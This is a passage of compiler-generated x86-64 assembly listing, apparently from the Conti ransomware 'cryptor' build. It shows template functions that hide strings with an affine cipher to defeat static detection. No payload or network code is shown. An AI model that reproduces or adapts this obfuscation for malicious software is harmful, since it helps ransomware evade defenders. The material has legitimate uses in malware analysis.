	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv94 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000dd	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  000e1	88 85 c0 00 00
	00		 mov	 BYTE PTR tv94[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  000e7	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000ee	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  000f5	5f		 pop	 rdi
  000f6	5d		 pop	 rbp
  000f7	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 47	 sub	 eax, 71			; 00000047H
  0002d	6b c0 e5	 imul	 eax, eax, -27
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 2f	 imul	 eax, eax, 47		; 0000002fH
  0002d	83 c0 47	 add	 eax, 71			; 00000047H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 06	 cmp	 QWORD PTR i$1[rbp], 6
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv140 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00131	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00135	88 85 c0 00 00
	00		 mov	 BYTE PTR tv140[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0013b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00142	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00149	5f		 pop	 rdi
  0014a	5d		 pop	 rbp
  0014b	c3		 ret	 0
??0?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 5a	 sub	 eax, 90			; 0000005aH
  0002d	6b c0 e8	 imul	 eax, eax, -24
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
